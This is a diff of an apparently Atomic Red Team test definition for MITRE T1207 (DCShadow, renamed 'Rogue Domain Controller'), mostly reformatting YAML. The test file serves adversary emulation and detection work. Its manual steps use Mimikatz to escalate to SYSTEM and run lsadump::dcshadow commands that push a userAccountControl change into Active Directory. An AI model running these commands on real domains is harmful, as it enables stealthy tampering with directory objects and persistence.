@@ -1,7 +1,5 @@
----
 attack_technique: T1207
-display_name: DCShadow
-
+display_name: Rogue Domain Controller
 atomic_tests:
 - name: DCShadow - Mimikatz
   auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
@@ -10,14 +8,13 @@ atomic_tests:
 
     [DCShadow](https://www.dcshadow.com/)
     [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
-
   supported_platforms:
-    - windows
-
+  - windows
   executor:
-    name: manual
     steps: |
       1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.
       2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
       3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
       4. lsadump::dcshadow /push
+    name: manual
+
